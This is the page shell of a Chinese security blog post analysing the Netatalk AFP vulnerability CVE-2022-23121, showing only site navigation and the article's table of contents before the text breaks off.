<!doctype html><html lang=zh-cn class="js csstransforms3d"><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.122.0"><meta name=description content="记录一些学习和生活日常"><meta name=author content="darkmoon"><link rel=icon href=/images/favicon.png type=image/png><title>CVE-2022-23121 AFP RCE 分析 - chestnut's blog</title>
<link href=/css/nucleus.css?1706695145 rel=stylesheet><link href=/css/fontawesome-all.min.css?1706695145 rel=stylesheet><link href=/css/hybrid.css?1706695145 rel=stylesheet><link href=/css/featherlight.min.css?1706695145 rel=stylesheet><link href=/css/perfect-scrollbar.min.css?1706695145 rel=stylesheet><link href=/css/auto-complete.css?1706695145 rel=stylesheet><link href=/css/atom-one-dark-reasonable.css?1706695145 rel=stylesheet><link href=/css/theme.css?1706695145 rel=stylesheet><link href=/css/tabs.css?1706695145 rel=stylesheet><link href=/css/hugo-theme.css?1706695145 rel=stylesheet><link href=/css/theme-blue.css?1706695145 rel=stylesheet><script src=/js/dayjs.min.js?1706695145></script><script src=/js/jquery-3.3.1.min.js?1706695145></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-F5TRJPEVXY"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-F5TRJPEVXY")</script><style>:root #header+#content>#left>#rlblock_left{display:none!important}</style></head><body data-url=/zh-cn/vulnerability/cve-2022-23121-afp-rce/><nav id=sidebar class=showVisitedLinks><div id=header-wrapper><div id=header><a id=logo href=/zh-cn><svg id="grav-logo" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%" viewBox="0 0 285.1 69.9"><g><path d="M35 0c9.6.0 17.9 3.4 24.7 10.3C66.5 17.1 70 25.3 70 35s-3.4 17.9-10.3 24.7C52.9 66.5 44.7 70 35 70c-9.7.0-17.9-3.4-24.7-10.3C3.4 52.8.0 44.6.0 34.9.0 25.3 3.4 17 10.3 10.2 17.1 3.4 25.3.0 35 0zM22.3 63.7c.3-7.4.3-14.7.0-22.1-2.1-.4-4-.4-5.9.0-.2.8-.2 2.5-.1 4.9.1 2.3.0 3.9-.3 4.8-1.7-.6-2.7-2.1-3.1-4.6-.1-.7-.1-3.3-.1-8 0-14.5-.1-23-.3-25.6-3.6 4.1-5.6 7-5.9 8.5v10.9c0 4.5.1 8.1.2 10.9.0.4.0 1.3-.1 2.8-.1 1.2.0 2.1.1 2.6.1.6 1.1 2.1 2.8 4.7C13.2 58.7 17.5 62.2 22.3 63.7zm22.3 1.7c.3-5 .2-12.9-.1-23.6-2.1-.3-4.1-.3-5.9.0-.2 2-.2 5.1-.1 9.5.1 4.3.0 7.5-.1 9.5-2.9.4-5 .3-6.2-.1-.2-5.6-.2-15.2-.1-28.7.1-12.4.0-21.8-.3-28.3-2.4.1-4.3.6-5.7 1.3-.1 7.7-.2 17.7-.1 30.1.0 16.5.0 26.6.0 30.3 2.3 1.1 5.4 1.7 9.4 1.7C38.9 66.9 42.1 66.4 44.6 65.4zM48.1 64.1c9.7-4.6 15.7-12 18-22.2-1.8-.2-3.8-.3-6.1-.3-1.6 3.9-2.6 6.3-3.2 7.2-1.1 1.7-2 2.5-2.7 2.5C54 46 54 39.1 54 30.5c0-11.5.0-18.4.0-20.9-1.4-1.4-3.3-2.5-5.7-3.4C48.1 6.3 48 6.4 48 6.7c0 3.5.0 13.1.0 28.8C47.9 47.2 48 56.8 48.1 64.1z"/></g><g><path d="M116.6 51.3h-29c-.5.0-.9-.1-1.3-.2-.4-.2-.7-.4-1-.7-.3-.3-.5-.6-.7-1s-.2-.8-.2-1.3V16.3h6.3V45h25.8v6.3z"/><path d="M154.8 51.3h-22.9c-.9.0-1.8-.2-2.9-.5-1-.3-2-.8-2.9-1.5s-1.6-1.6-2.2-2.8c-.6-1.1-.9-2.5-.9-4.2V19.5c0-.4.1-.9.2-1.2.2-.4.4-.7.7-1s.6-.5 1-.7.8-.2 1.3-.2h28.6v6.3h-25.4v19.8c0 .8.2 1.5.7 1.9s1.1.7 1.9.7h22.9v6.2zM151.9 37h-20v-6.4h20V37z"/><path d="M197.3 51.3H191v-8.6h-22.3v8.6h-6.3V33.8c0-2.6.4-4.9 1.3-7.1s2.1-4 3.7-5.5 3.4-2.8 5.5-3.6c2.1-.9 4.5-1.3 7-1.3h14.3c.4.0.9.1 1.2.2.4.2.7.4 1 .7s.5.6.7 1 .2.8.2 1.2V51.3zM168.7 36.4H191V22.6h-11.2c-.2.0-.6.0-1.2.1s-1.4.2-2.2.4c-.8.2-1.7.6-2.6 1-.9.5-1.8 1.1-2.5 2-.8.8-1.4 1.9-1.9 3.1-.5 1.2-.7 2.8-.7 4.5v2.7z"/><path d="M241.7 28.1c0 1.4-.2 2.7-.5 3.9-.4 1.1-.8 2.1-1.5 3-.6.9-1.3 1.6-2.1 2.2-.8.6-1.6 1.1-2.5 1.5s-1.8.7-2.6.9c-.9.2-1.7.3-2.5.3l13.3 11.5h-9.8l-13.2-11.5h-4.6v-6.3H230c.8-.1 1.5-.2 2.2-.5s1.2-.6 1.7-1.1.9-1 1.1-1.6c.3-.6.4-1.4.4-2.2v-4c0-.4.0-.6-.1-.8s-.2-.3-.3-.4c-.1-.1-.3-.1-.4-.2-.2.0-.3.0-.4.0h-20.9v28.7H207v-32c0-.4.1-.9.2-1.2.2-.4.4-.7.7-1 .3-.3.6-.5 1-.7s.8-.2 1.3-.2H234c1.4.0 2.6.3 3.6.8s1.8 1.2 2.4 1.9c.6.8 1 1.6 1.3 2.5s.4 1.7.4 2.5v4z"/><path d="M285.1 48.6c0 .5-.1.9-.3 1.3s-.4.7-.7 1-.6.5-1 .7-.8.2-1.2.2-.8-.1-1.2-.2-.8-.4-1.1-.7l-23.2-24.2v24.7h-6.3V19c0-.7.2-1.2.5-1.8.4-.5.8-.9 1.4-1.2.6-.2 1.2-.3 1.9-.2s1.2.4 1.6.9l23.2 24.2V16.3h6.3V48.6z"/></g></svg></a></div><div class=searchbox><label for=search-by><i class="fas fa-search"></i></label>
<input data-search-input id=search-by type=search placeholder=搜索...>
<span data-search-clear><i class="fas fa-times"></i></span></div><script type=text/javascript src=/js/lunr.min.js?1706695145></script><script type=text/javascript src=/js/auto-complete.js?1706695145></script><script type=text/javascript>var baseurl="https://www.ch35tnut.site/zh-cn"</script><script type=text/javascript src=/js/search.js?1706695145></script></div><section id=homelinks><ul><li><a class=padding href=/zh-cn><i class='fas fa-home'></i> 首页</a></li></ul></section><div class=highlightable><ul class=topics><li data-nav-id=/zh-cn/research/ title=安全研究 class=dd-item><a href=/zh-cn/research/><b>X. </b>安全研究
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/iot/ title=Iot class=dd-item><a href=/zh-cn/research/iot/><b>X. </b>Iot
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/linux/ title=Linux class=dd-item><a href=/zh-cn/research/linux/><b>X. </b>Linux
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/linux/malware/ title=Malware class=dd-item><a href=/zh-cn/research/linux/malware/><b>X. </b>Malware
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/linux/suid/ title=Suid class=dd-item><a href=/zh-cn/research/linux/suid/>Suid
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/windows/ title=Windows class=dd-item><a href=/zh-cn/research/windows/><b>X. </b>Windows
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/windows/dll-inject/ title=Dll注入 class=dd-item><a href=/zh-cn/research/windows/dll-inject/><b>X. </b>Dll注入
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/windows/pe/ title=Pe class=dd-item><a href=/zh-cn/research/windows/pe/><b>X. </b>Pe
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/protocol/ title=协议 class=dd-item><a href=/zh-cn/research/protocol/><b>X. </b>协议
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/protocol/ntlm/ title="NTLM 协议" class=dd-item><a href=/zh-cn/research/protocol/ntlm/><b>X. </b>NTLM 协议
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/protocol/kerberos/ title="Kerberos 协议" class=dd-item><a href=/zh-cn/research/protocol/kerberos/><b>X. </b>Kerberos 协议
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/protocol/kerberos/kerberos-in-windows/ title=Windows中的kerberos协议 class=dd-item><a href=/zh-cn/research/protocol/kerberos/kerberos-in-windows/><b>X. </b>Windows中的kerberos协议
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/ title=认证原理 class=dd-item><a href=/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/>认证原理
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/protocol/netlogon/ title=Netlogon class=dd-item><a href=/zh-cn/research/protocol/netlogon/>Netlogon
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/web/ title=Web class=dd-item><a href=/zh-cn/research/web/><b>X. </b>Web
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/web/java-deserialization/ title="Java Deserialization" class=dd-item><a href=/zh-cn/research/web/java-deserialization/><b>X. </b>Java Deserialization
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/ title="CommonsBeanutils1 Chain" class=dd-item><a href=/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/>CommonsBeanutils1 Chain
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/web/java-deserialization/urldns/ title="JAVA URL DNS 研究" class=dd-item><a href=/zh-cn/research/web/java-deserialization/urldns/>JAVA URL DNS 研究
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/web/php-filter-rce/ title="PHP Filter RCE 分析" class=dd-item><a href=/zh-cn/research/web/php-filter-rce/>PHP Filter RCE 分析
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/code-audit/ title=代码审计 class=dd-item><a href=/zh-cn/research/code-audit/><b>X. </b>代码审计
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/code-audit/codeql/ title=Codeql class=dd-item><a href=/zh-cn/research/code-audit/codeql/><b>X. </b>Codeql
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/code-audit/wireshark-185/ title="Wireshark 1.8.5代码审计" class=dd-item><a href=/zh-cn/research/code-audit/wireshark-185/>Wireshark 1.8.5代码审计
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/code-audit/news-server/ title="News Server审计" class=dd-item><a href=/zh-cn/research/code-audit/news-server/>News Server审计
<i class="fas fa-check read-icon"></i></a></li></ul></li></ul></li><li data-nav-id=/zh-cn/vulnerability/ title=漏洞分析 class="dd-item
parent"><a href=/zh-cn/vulnerability/><b>X. </b>漏洞分析
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/vulnerability/windows-clfs-eop/ title="Windows CLFS EoP" class=dd-item><a href=/zh-cn/vulnerability/windows-clfs-eop/><b>X. </b>Windows CLFS EoP
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/vulnerability/windows-clfs-eop/cve-2023-28252/ title=CVE-2023-28252 class=dd-item><a href=/zh-cn/vulnerability/windows-clfs-eop/cve-2023-28252/>CVE-2023-28252
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/ title=CVE-2022-37969 class=dd-item><a href=/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/>CVE-2022-37969
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-7028-gitlab-account-takeover/ title="CVE-2023-7028 GitLab Account Takeover" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-7028-gitlab-account-takeover/>CVE-2023-7028 GitLab Account Takeover
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/ title="CVE-2016-4437 Shiro 550 RCE 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/>CVE-2016-4437 Shiro 550 RCE 分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/ title="CVE 2023 6553 Wordpress Backup Migration Plugin RCE" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/>CVE 2023 6553 Wordpress Backup Migration Plugin RCE
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-50164-apache-struts-rce/ title="CVE-2023-50164 Apache Struts RCE分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-50164-apache-struts-rce/>CVE-2023-50164 Apache Struts RCE分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-21746-windows-ntlm-privilege-escalation/ title="CVE-2023-21746 Windows NTLM Privilege Escalation" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-21746-windows-ntlm-privilege-escalation/>CVE-2023-21746 Windows NTLM Privilege Escalation
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2020-17530-apache-struts-ognl-rce/ title="CVE-2020-17530 Apache Struts OGNL RCE分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2020-17530-apache-struts-ognl-rce/>CVE-2020-17530 Apache Struts OGNL RCE分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2021-4034-polkit-eop/ title="CVE-2021-4034 Polkit 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2021-4034-polkit-eop/>CVE-2021-4034 Polkit 权限提升漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/ title="CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/>CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2022-23121-afp-rce/ title="CVE-2022-23121 AFP RCE 分析" class="dd-item active"><a href=/zh-cn/vulnerability/cve-2022-23121-afp-rce/>CVE-2022-23121 AFP RCE 分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/ title="CVE-2023-36563 Wordpad Info Disclosure 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/>CVE-2023-36563 Wordpad Info Disclosure 分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/squid-dos/ title="Squid 拒绝服务漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/squid-dos/>Squid 拒绝服务漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/ title="CVE-2023-4966 Citrix Gateway 信息泄露漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/>CVE-2023-4966 Citrix Gateway 信息泄露漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/ title="CVE-2023-44487 Http2 Rapid Reset DDOS Attack 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/>CVE-2023-44487 Http2 Rapid Reset DDOS Attack 分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/ title="CVE-2023-38545 Curl 堆溢出漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/>CVE-2023-38545 Curl 堆溢出漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-4863-libwebp-rce/ title="CVE-2023-4863 Libwebp Rce 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-4863-libwebp-rce/>CVE-2023-4863 Libwebp Rce 分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/ title="CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/>CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/ title="瑞友天翼 Rce分析" class=dd-item><a href=/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/>瑞友天翼 Rce分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/ title="CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/>CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/ title="CVE-2023-38148 Windows Ics Rce分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/>CVE-2023-38148 Windows Ics Rce分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/ title="CVE-2023-3519 Cirtix Gateway RCE分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/>CVE-2023-3519 Cirtix Gateway RCE分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-32315-openfire-auth-bypass/ title="CVE-2023-32315 Openfire 身份认证绕过漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-32315-openfire-auth-bypass/>CVE-2023-32315 Openfire 身份认证绕过漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/smartbi-rce/ title="Smartbi RCE 分析" class=dd-item><a href=/zh-cn/vulnerability/smartbi-rce/>Smartbi RCE 分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/ title="CVE-2023-2825 Gitlab 路径穿越漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/>CVE-2023-2825 Gitlab 路径穿越漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/zero-logon/ title="Zero Logon 分析" class=dd-item><a href=/zh-cn/vulnerability/zero-logon/>Zero Logon 分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/ title="CVE-2022-4223 PgAdmin RCE 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/>CVE-2022-4223 PgAdmin RCE 分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/strapi-rce/ title="Strapi RCE 漏洞链分析" class=dd-item><a href=/zh-cn/vulnerability/strapi-rce/>Strapi RCE 漏洞链分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/ title="CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/>CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2021-3156-sudo-eop/ title="CVE-2021-3156 Sudo 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2021-3156-sudo-eop/>CVE-2021-3156 Sudo 权限提升漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/ title="CVE-2023-28432 MinIO 信息泄露漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/>CVE-2023-28432 MinIO 信息泄露漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-23397-outlook-eop/ title="CVE-2023-23397 Outlook 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-23397-outlook-eop/>CVE-2023-23397 Outlook 权限提升漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/proxy-not-shell/ title="Proxy Not Shell 利用链分析" class=dd-item><a href=/zh-cn/vulnerability/proxy-not-shell/>Proxy Not Shell 利用链分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2021-40449-win32k-eop/ title="CVE-2021-40449 Win32k 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2021-40449-win32k-eop/>CVE-2021-40449 Win32k 权限提升漏洞分析
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/dailylife/ title=生活随笔 class=dd-item><a href=/zh-cn/dailylife/><b>X. </b>生活随笔
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/dailylife/movies/ title=Movies class=dd-item><a href=/zh-cn/dailylife/movies/><b>X. </b>Movies
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/dailylife/movies/2024-%E6%BD%9C%E8%A1%8C/ title="2024 潜行" class=dd-item><a href=/zh-cn/dailylife/movies/2024-%E6%BD%9C%E8%A1%8C/>2024 潜行
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/dailylife/%E5%90%90%E6%A7%BD/ title=吐槽 class=dd-item><a href=/zh-cn/dailylife/%E5%90%90%E6%A7%BD/>吐槽
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/dailylife/2023-review-and-2024-outlook/ title=2023年总结和2024年展望 class=dd-item><a href=/zh-cn/dailylife/2023-review-and-2024-outlook/>2023年总结和2024年展望
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/misc/ title=杂项 class=dd-item><a href=/zh-cn/misc/><b>X. </b>杂项
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tools/ title=Tools class=dd-item><a href=/zh-cn/misc/tools/><b>X. </b>Tools
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tools/citrix-update-monitor/ title="【工具】Citrix NetScaler 更新监控" class=dd-item><a href=/zh-cn/misc/tools/citrix-update-monitor/>【工具】Citrix NetScaler 更新监控
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/misc/encoding/ title=Encoding class=dd-item><a href=/zh-cn/misc/encoding/><b>X. </b>Encoding
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/encoding/utf-7/ title="Utf 7" class=dd-item><a href=/zh-cn/misc/encoding/utf-7/>Utf 7
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/misc/encoding/unicode/ title=Unicode class=dd-item><a href=/zh-cn/misc/encoding/unicode/>Unicode
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/misc/tunnel/ title=隧道 class=dd-item><a href=/zh-cn/misc/tunnel/><b>X. </b>隧道
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tunnel/application-layer/ title=应用层隧道 class=dd-item><a href=/zh-cn/misc/tunnel/application-layer/><b>X. </b>应用层隧道
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tunnel/application-layer/ssh-tunnel/ title=SSH隧道 class=dd-item><a href=/zh-cn/misc/tunnel/application-layer/ssh-tunnel/>SSH隧道
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/misc/tunnel/transport-layer/ title=传输层隧道 class=dd-item><a href=/zh-cn/misc/tunnel/transport-layer/><b>X. </b>传输层隧道
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tunnel/transport-layer/socks/ title=Socks隧道 class=dd-item><a href=/zh-cn/misc/tunnel/transport-layer/socks/><b>X. </b>Socks隧道
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/misc/tunnel/network-layer/ title=网络层隧道 class=dd-item><a href=/zh-cn/misc/tunnel/network-layer/><b>X. </b>网络层隧道
<i class="fas fa-check read-icon"></i></a></li></ul></li></ul></li><li data-nav-id=/zh-cn/others/ title=其他 class=dd-item><a href=/zh-cn/others/><b>X. </b>其他
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/others/add-timeline-shortcode/ title=给hugo-theme-learn增加timeline功能 class=dd-item><a href=/zh-cn/others/add-timeline-shortcode/>给hugo-theme-learn增加timeline功能
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/ title="在Windows server 2019上重置密码" class=dd-item><a href=/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/>在Windows server 2019上重置密码
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/ title=基于Vmware的小型域网络搭建 class=dd-item><a href=/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/>基于Vmware的小型域网络搭建
<i class="fas fa-check read-icon"></i></a></li></ul></li></ul><section id=shortcuts><h3>更多</h3><ul><li><a class=padding href=https://www.ch35tnut.site/zh-cn/about><i class='fas fa-person-booth'></i> 关于</a></li><li><a class=padding href=https://github.com/Chestnut4/><i class='fab fa-github'></i> Github 链接</a></li><li><a class=padding href=https://www.ch35tnut.site/zh-cn/tags><i class='fas fa-tags'></i> 标签</a></li><li><a class=padding href=https://www.ch35tnut.site/zh-cn/index.xml><i class='fas fa-fw fa-link'></i> RSS</a></li></ul></section><section id=prefooter><hr><ul><li><a class=padding><i class="fas fa-language fa-fw"></i><div class=select-style><select id=select-language onchange="location=this.value"><option id=zh-cn value=https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-23121-afp-rce/ selected>简体中文</option></select><svg id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="255" height="255" viewBox="0 0 255 255" style="enable-background:new 0 0 255 255"><g><g id="arrow-drop-down"><polygon points="0,63.75 127.5,191.25 255,63.75"/></g></g></svg></div></a></li><li><a class=padding href=# data-clear-history-toggle><i class="fas fa-history fa-fw"></i> 清理历史记录</a></li></ul></section><section id=footer><center></center><script async defer src=https://buttons.github.io/buttons.js></script></section></div></nav><section id=body><div id=overlay></div><div class="padding highlightable"><div><div id=top-bar><div id=breadcrumbs itemscope itemtype=http://data-vocabulary.org/Breadcrumb><span id=sidebar-toggle-span><a href=# id=sidebar-toggle data-sidebar-toggle><i class="fas fa-bars"></i>
</a></span><span id=toc-menu><i class="fas fa-list-alt"></i></span>
<span class=links><a href=/zh-cn/>首页</a> > <a href=/zh-cn/vulnerability/>漏洞分析</a> > CVE-2022-23121 AFP RCE 分析</span></div><div class=progress><div class=wrapper><nav id=TableOfContents><ul><li><ul><li><a href=#netatalk介绍>Netatalk介绍</a></li><li><a href=#漏洞简介>漏洞简介</a></li><li><a href=#appledouble文件>Appledouble文件</a></li><li><a href=#如何生成有效的appledouble文件触发漏洞>如何生成有效的<strong>AppleDouble文件触发漏洞</strong></a></li><li><a href=#漏洞成因>漏洞成因</a></li><li><a href=#分析函数调用链><strong>分析函数调用链</strong></a></li><li><a href=#触发漏洞流程><strong>触发漏洞流程</strong></a></li></ul></li><li><a href=#环境搭建>环境搭建</a></li><li><a href=#调试>调试</a><ul><li><a href=#为什么要设置条件断点><strong>为什么要设置条件断点</strong></a></li><li><a href=#正常调试><strong>正常调试</strong></a></li><li><a href=#如何利用entry内的越界>如何利用entry内的越界</a></li><li><a href=#补丁分析>补丁分析</a></li><li><a href=#函数解释>函数解释</a></li><li><a href=#参考链接>参考链接</a></li></ul></li></ul></nav></div></div></div></div><div id=head-tags><div class=tags><a class=tag-link href=/zh-cn/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90>漏洞分析</a></div></div><div id=body-inner><h1>CVE-2022-23121 AFP RCE 分析</h1><div class=progress><div class=wrapper></div></div><nav id=TableOfContents><ul><li><ul><li><a href=#netatalk介绍>Netatalk介绍</a></li><li><a href=#漏洞简介>漏洞简介</a></li><li><a href=#appledouble文件>Appledouble文件</a></li><li><a href=#如何生成有效的appledouble文件触发漏洞>如何生成有效的<strong>AppleDouble文件触发漏洞</strong></a></li><li><a 